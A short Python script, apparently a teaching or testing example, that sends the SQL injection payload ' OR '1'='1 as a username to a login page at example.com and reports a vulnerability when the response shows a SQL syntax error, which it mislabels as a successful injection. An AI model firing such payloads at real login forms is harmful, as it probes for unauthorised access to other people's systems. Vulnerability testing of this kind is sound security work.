import requests

def sql_injection_test(payload):
    url = "https://example.com/login"
    response = requests.get(url, params={"username": payload, "password": "password"})
    return "SQL syntax error" in response.text

# Exemplo de uso:
injection_payload = "' OR '1'='1"
if sql_injection_test(injection_payload):
    print("SQL Injection successful!")
else:
    print("No SQL Injection vulnerability detected.")
